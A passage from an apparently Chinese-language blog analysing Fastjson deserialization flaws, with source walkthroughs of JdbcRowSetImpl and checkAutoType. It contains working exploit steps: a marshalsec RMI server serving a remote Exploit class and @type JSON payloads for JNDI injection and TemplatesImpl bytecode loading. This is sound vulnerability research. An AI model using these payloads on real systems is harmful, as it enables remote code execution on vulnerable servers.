</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kt>void</span> <span class=nf>setAutoCommit</span><span class=o>(</span><span class=kt>boolean</span> <span class=n>var1</span><span class=o>)</span> <span class=kd>throws</span> <span class=n>SQLException</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>conn</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=o>.</span><span class=na>conn</span><span class=o>.</span><span class=na>setAutoCommit</span><span class=o>(</span><span class=n>var1</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=o>.</span><span class=na>conn</span> <span class=o>=</span> <span class=k>this</span><span class=o>.</span><span class=na>connect</span><span class=o>();</span>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=o>.</span><span class=na>conn</span><span class=o>.</span><span class=na>setAutoCommit</span><span class=o>(</span><span class=n>var1</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>继续跟进 <code>this.connect()</code> ，发现存在JNDI注入：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>private</span> <span class=n>Connection</span> <span class=nf>connect</span><span class=o>()</span> <span class=kd>throws</span> <span class=n>SQLException</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>conn</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>this</span><span class=o>.</span><span class=na>conn</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>else</span> <span class=k>if</span> <span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>getDataSourceName</span><span class=o>()</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>InitialContext</span> <span class=n>var1</span> <span class=o>=</span> <span class=k>new</span> <span class=n>InitialContext</span><span class=o>();</span>
</span></span><span class=line><span class=cl>            <span class=n>DataSource</span> <span class=n>var2</span> <span class=o>=</span> <span class=o>(</span><span class=n>DataSource</span><span class=o>)</span><span class=n>var1</span><span class=o>.</span><span class=na>lookup</span><span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>getDataSourceName</span><span class=o>());</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=k>this</span><span class=o>.</span><span class=na>getUsername</span><span class=o>()</span> <span class=o>!=</span> <span class=kc>null</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=k>this</span><span class=o>.</span><span class=na>getUsername</span><span class=o>().</span><span class=na>equals</span><span class=o>(</span><span class=s>&#34;&#34;</span><span class=o>)</span> <span class=o>?</span> <span class=n>var2</span><span class=o>.</span><span class=na>getConnection</span><span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>getUsername</span><span class=o>(),</span> <span class=k>this</span><span class=o>.</span><span class=na>getPassword</span><span class=o>())</span> <span class=o>:</span> <span class=n>var2</span><span class=o>.</span><span class=na>getConnection</span><span class=o>();</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>NamingException</span> <span class=n>var3</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=k>new</span> <span class=n>SQLException</span><span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>resBundle</span><span class=o>.</span><span class=na>handleGetObject</span><span class=o>(</span><span class=s>&#34;jdbcrowsetimpl.connect&#34;</span><span class=o>).</span><span class=na>toString</span><span class=o>());</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>this</span><span class=o>.</span><span class=na>getUrl</span><span class=o>()</span> <span class=o>!=</span> <span class=kc>null</span> <span class=o>?</span> <span class=n>DriverManager</span><span class=o>.</span><span class=na>getConnection</span><span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>getUrl</span><span class=o>(),</span> <span class=k>this</span><span class=o>.</span><span class=na>getUsername</span><span class=o>(),</span> <span class=k>this</span><span class=o>.</span><span class=na>getPassword</span><span class=o>())</span> <span class=o>:</span> <span class=kc>null</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>并且JNDI注入位置 <code>var1.lookup(this.getDataSourceName())</code> 中，其中的 <code>this.getDataSourceName()</code> 就是前面我们通过调用 <code>setDataSourceName()</code> 赋值的值，这个值可以被我们攻击者随意控制，也就是攻击者可以控制JNDI的lookup的地址，从而造成JNDI注入。</p><p>首先准备一个继承了ObjectFactory类的任意类，在其静态代码块中执行命令，并且将这个类编译成class文件，命名为Exploit.class，注意，这个类不能有package。</p><p>然后在Exploit.class文件所在的目录下起一个HTTP服务，使用python起HTTP服务的命令如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -m http.server <span class=m>80</span>
</span></span><span class=line><span class=cl>// Or python2
</span></span><span class=line><span class=cl>python2 -m SimpleHTTPServer <span class=m>80</span>
</span></span></code></pre></td></tr></table></div></div><p>最后使用marshallsec起一个RMIRefServer：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>java -cp marshalsec.jar marshalsec.jndi.RMIRefServer http://127.0.0.1/css/#Shell <span class=m>1099</span>
</span></span></code></pre></td></tr></table></div></div><p>当靶机执行如下代码时，将会触发前面分析过的JNDI注入了，并且RCE成功：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>exp1</span><span class=o>(){</span>
</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>exp</span><span class=o>=</span><span class=s>&#34;{\n&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;  \&#34;test\&#34;: {\n&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;    \&#34;@type\&#34;: \&#34;com.sun.rowset.JdbcRowSetImpl\&#34;,\n&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;    \&#34;dataSourceName\&#34;: \&#34;rmi://127.0.0.1:1099/Exploit\&#34;,\n&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;    \&#34;autoCommit\&#34;: true\n&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;  }\n&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;}&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=n>JSON</span><span class=o>.</span><span class=na>parse</span><span class=o>(</span><span class=n>exp</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/media/2021-08-02-03.png alt></p><p>Gadget Chain如下：</p><p><img src=/media/2021-08-02-04.png alt></p><p>然后分析一下EXP 2，首先看到EXP 2：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// EXP 2
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>{</span>
</span></span><span class=line><span class=cl>  <span class=s>&#34;test&#34;</span><span class=o>:</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;@type&#34;</span><span class=o>:</span> <span class=s>&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class=o>,</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;_bytecodes&#34;</span><span class=o>:</span> <span class=o>[</span><span class=s>&#34;Your Eval Class Bytecodes&#34;</span><span class=o>],</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;_name&#34;</span><span class=o>:</span> <span class=s>&#34;p1n93r&#34;</span><span class=o>,</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;_tfactory&#34;</span><span class=o>:</span> <span class=o>{},</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;_outputProperties&#34;</span><span class=o>:</span> <span class=o>{}</span>
</span></span><span class=line><span class=cl>  <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>一些解释如下所示：</p><ul><li>_bytecodes：编译恶意类后得到的二进制class（需要继承AbstractTranslet）数据的base64编码字符串，需要继承 <code>AbstractTranslet</code> 类的原因主要是存在类型检查，检查失败会直接抛出异常，不能调用 <code>newInstance()</code> 实例化恶意类来触发RCE了；</li><li>_name：不能为空，主要是为了 <code>TemplatesImpl#getTransletInstance()</code> 中能顺利往下执行，否则不能往下执行： <code>defineTransletClasses()</code> ;</li><li>_tfactory：不能为空，主要是为了 <code>TemplatesImpl#defineTransletClasses()</code> 中能顺利往下执行，否则在有的JDK版本中无法往下执行： <code>loader.defineClass(_bytecodes[i])</code> ;</li><li>_outputProperties：FastJson调用 <code>TemplatesImpl#getOutputProperties()</code> 时，会调用 <code>TemplatesImpl#newTransformer()</code> ，是整个Gadget的入口。</li></ul><p>Gadget Chain如下：</p><ol><li>TemplatesImpl#getOutputProperties()</li><li>TemplatesImpl#newTransformer()</li><li>TemplatesImpl#getTransletInstance()中的 <code>defineTransletClasses()</code> ;</li><li>TemplatesImpl#getTransletInstance()中的 <code>_class[_transletIndex].newInstance()</code> ;</li></ol><p>前面我们分析过，基于Fastjson调用 <code>JSON.parse(String)</code> 会调用属性的setter方法为属性赋值，但是这个Gadget是如何做到调用 <code>_outputProperties</code> 属性的getter方法的呢？</p><p>主要原因是在 <code>JavaBeanInfo#build()</code> 中，对于getter返回值类型为Collection、Map、AtomicBoolean、AtomicInteger和AtomicLong的getter方法，会将其封装成fieldInfo，然后添加到fieldList中，后续会在 <code>FieldDeserializer#setValue()</code> 中调用fieldList中存储的fieldInfo对应的method。这里会成功将getOutputProperties方法封装成fieldInfo存入fieldList（因为其返回值类型Properties继承Map类），所以得以调用 <code>TemplatesImpl#getOutputProperties()</code> ;</p><h3 id=1225--version--1241>1.2.25 &lt;= Version &lt;= 1.2.41</h3><p>1.2.25之前fastjson默认开启autoType，但是从1.2.25开始默认关闭了autoType支持。并且新增了ParseConfig#checkAutoType方法进行黑白名单的检测。</p><p>注意，这个版本区间内的EXP，不是对autoType的绕过，可以说 <strong>只是对ParseConfig#checkAutoType()内的黑白名单的绕过</strong> 。也就是说，这个版本区间内，想攻击成功，必须得开启 <strong>autoTypeSupport</strong> 选项。</p><p>首先说明一下，以下两种情况不会进入到 <code>ParseConfig#checkAutoType()</code> ：</p><ul><li>JSON字符串未使用@type；</li><li>@type与JSON.parseObject(String, Class)中的Class相同；</li></ul><p>下面分四种不同的情况来分析 <code>ParseConfig#checkAutoType()</code> 的机制（基于1.2.25版本分析）：</p><table><thead><tr><th>情况</th><th style=text-align:center>autoTypeSupport是否开启</th><th style=text-align:center>反序列化方式</th></tr></thead><tbody><tr><td>1</td><td style=text-align:center>否</td><td style=text-align:center>JSON.parse(String)</td></tr><tr><td>2</td><td style=text-align:center>否</td><td style=text-align:center>JSON.parseObject(String, Class)</td></tr><tr><td>3</td><td style=text-align:center>是</td><td style=text-align:center>JSON.parse(String)</td></tr><tr><td>4</td><td style=text-align:center>是</td><td style=text-align:center>JSON.parseObject(String, Class)</td></tr></tbody></table><h4 id=情况1>情况1</h4><p>例如如下代码所示，属于情况1，没有手动开启 <code>autoTypeSupport</code> ：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>normal</span><span class=o>()</span><span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>userJson</span><span class=o>=</span><span class=s>&#34;{\&#34;@type\&#34;:\&#34;com.pinger.javasec.fastjson.User\&#34;,\&#34;address\&#34;:\&#34;QT\&#34;,\&#34;age\&#34;:0,\&#34;name\&#34;:\&#34;p1n93r\&#34;}&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=n>JSON</span><span class=o>.</span><span class=na>parse</span><span class=o>(</span><span class=n>userJson</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>首先贴上 <code>ParseConfig#checkAutoType()</code> 源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>checkAutoType</span><span class=o>(</span><span class=n>String</span> <span class=n>typeName</span><span class=o>,</span> <span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>expectClass</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>typeName</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>null</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>final</span> <span class=n>String</span> <span class=n>className</span> <span class=o>=</span> <span class=n>typeName</span><span class=o>.</span><span class=na>replace</span><span class=o>(</span><span class=sc>&#39;$&#39;</span><span class=o>,</span> <span class=sc>&#39;.&#39;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>autoTypeSupport</span> <span class=o>||</span> <span class=n>expectClass</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=o>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=n>0</span><span class=o>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>acceptList</span><span class=o>.</span><span class=na>length</span><span class=o>;</span> <span class=o>++</span><span class=n>i</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>String</span> <span class=n>accept</span> <span class=o>=</span> <span class=n>acceptList</span><span class=o>[</span><span class=n>i</span><span class=o>];</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(</span><span class=n>className</span><span class=o>.</span><span class=na>startsWith</span><span class=o>(</span><span class=n>accept</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>TypeUtils</span><span class=o>.</span><span class=na>loadClass</span><span class=o>(</span><span class=n>typeName</span><span class=o>,</span> <span class=n>defaultClassLoader</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=o>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=n>0</span><span class=o>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>denyList</span><span class=o>.</span><span class=na>length</span><span class=o>;</span> <span class=o>++</span><span class=n>i</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>String</span> <span class=n>deny</span> <span class=o>=</span> <span class=n>denyList</span><span class=o>[</span><span class=n>i</span><span class=o>];</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(</span><span class=n>className</span><span class=o>.</span><span class=na>startsWith</span><span class=o>(</span><span class=n>deny</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=k>throw</span> <span class=k>new</span> <span class=n>JSONException</span><span class=o>(</span><span class=s>&#34;autoType is not support. &#34;</span> <span class=o>+</span> <span class=n>typeName</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>clazz</span> <span class=o>=</span> <span class=n>TypeUtils</span><span class=o>.</span><span class=na>getClassFromMapping</span><span class=o>(</span><span class=n>typeName</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>clazz</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>clazz</span> <span class=o>=</span> <span class=n>deserializers</span><span class=o>.</span><span class=na>findClass</span><span class=o>(</span><span class=n>typeName</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>clazz</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>expectClass</span> <span class=o>!=</span> <span class=kc>null</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=n>expectClass</span><span class=o>.</span><span class=na>isAssignableFrom</span><span class=o>(</span><span class=n>clazz</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=k>new</span> <span class=n>JSONException</span><span class=o>(</span><span class=s>&#34;type not match. &#34;</span> <span class=o>+</span> <span class=n>typeName</span> <span class=o>+</span> <span class=s>&#34; -&gt; &#34;</span> <span class=o>+</span> <span class=n>expectClass</span><span class=o>.</span><span class=na>getName</span><span class=o>());</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>clazz</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(!</span><span class=n>autoTypeSupport</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=o>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=n>0</span><span class=o>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>denyList</span><span class=o>.</span><span class=na>length</span><span class=o>;</span> <span class=o>++</span><span class=n>i</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>String</span> <span class=n>deny</span> <span class=o>=</span> <span class=n>denyList</span><span class=o>[</span><span class=n>i</span><span class=o>];</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(</span><span class=n>className</span><span class=o>.</span><span class=na>startsWith</span><span class=o>(</span><span class=n>deny</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=k>throw</span> <span class=k>new</span> <span class=n>JSONException</span><span class=o>(</span><span class=s>&#34;autoType is not support. &#34;</span> <span class=o>+</span> <span class=n>typeName</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=o>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=n>0</span><span class=o>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>acceptList</span><span class=o>.</span><span class=na>length</span><span class=o>;</span> <span class=o>++</span><span class=n>i</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>String</span> <span class=n>accept</span> <span class=o>=</span> <span class=n>acceptList</span><span class=o>[</span><span class=n>i</span><span class=o>];</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(</span><span class=n>className</span><span class=o>.</span><span class=na>startsWith</span><span class=o>(</span><span class=n>accept</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>clazz</span> <span class=o>=</span> <span class=n>TypeUtils</span><span class=o>.</span><span class=na>loadClass</span><span class=o>(</span><span class=n>typeName</span><span class=o>,</span> <span class=n>defaultClassLoader</span><span class=o>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=o>(</span><span class=n>expectClass</span> <span class=o>!=</span> <span class=kc>null</span> <span class=o>&amp;&amp;</span> <span class=n>expectClass</span><span class=o>.</span><span class=na>isAssignableFrom</span><span class=o>(</span><span class=n>clazz</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>throw</span> <span class=k>new</span> <span class=n>JSONException</span><span class=o>(</span><span class=s>&#34;type not match. &#34;</span> <span class=o>+</span> <span class=n>typeName</span> <span class=o>+</span> <span class=s>&#34; -&gt; &#34;</span> <span class=o>+</span> <span class=n>expectClass</span><span class=o>.</span><span class=na>getName</span><span class=o>());</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>clazz</span><span class=o>;</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>autoTypeSupport</span> <span class=o>||</span> <span class=n>expectClass</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>clazz</span> <span class=o>=</span> <span class=n>TypeUtils</span><span class=o>.</span><span class=na>loadClass</span><span class=o>(</span><span class=n>typeName</span><span class=o>,</span> <span class=n>defaultClassLoader</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>clazz</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>ClassLoader</span><span class=o>.</span><span class=na>class</span><span class=o>.</span><span class=na>isAssignableFrom</span><span class=o>(</span><span class=n>clazz</span><span class=o>)</span> <span class=c1>// classloader is danger
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=o>||</span> <span class=n>DataSource</span><span class=o>.</span><span class=na>class</span><span class=o>.</span><span class=na>isAssignableFrom</span><span class=o>(</span><span class=n>clazz</span><span class=o>)</span> <span class=c1>// dataSource can load jdbc driver
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=k>new</span> <span class=n>JSONException</span><span class=o>(</span><span class=s>&#34;autoType is not support. &#34;</span> <span class=o>+</span> <span class=n>typeName</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>expectClass</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(</span><span class=n>expectClass</span><span class=o>.</span><span class=na>isAssignableFrom</span><span class=o>(</span><span class=n>clazz</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>clazz</span><span class=o>;</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=k>throw</span> <span class=k>new</span> <span class=n>JSONException</span><span class=o>(</span><span class=s>&#34;type not match. &#34;</span> <span class=o>+</span> <span class=n>typeName</span> <span class=o>+</span> <span class=s>&#34; -&gt; &#34;</span> <span class=o>+</span> <span class=n>expectClass</span><span class=o>.</span><span class=na>getName</span><span class=o>());</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>	<span class=c1>// 情况1最终会进入到这里，抛出异常，无法反序列化
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=o>(!</span><span class=n>autoTypeSupport</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>throw</span> <span class=k>new</span> <span class=n>JSONException</span><span class=o>(</span><span class=s>&#34;autoType is not support. &#34;</span> <span class=o>+</span> <span class=n>typeName</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>clazz</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
